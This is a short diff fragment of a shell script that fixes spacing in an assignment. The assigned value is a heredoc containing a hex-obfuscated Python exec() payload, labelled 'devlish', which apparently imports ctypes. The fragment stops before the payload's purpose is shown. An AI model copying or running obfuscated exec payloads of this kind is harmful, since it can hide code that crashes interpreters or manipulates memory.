@@ -4,7 +4,7 @@
 set +e
 
 # A devlish cpython payload
-payload= $(cat << EOF
+payload=$(cat << EOF
 exec('\
 \x66\x72\x6f\x6d\x20\x63\x74\x79\
 \x70\x65\x73\x20\x69\x6d\x70\x6f\
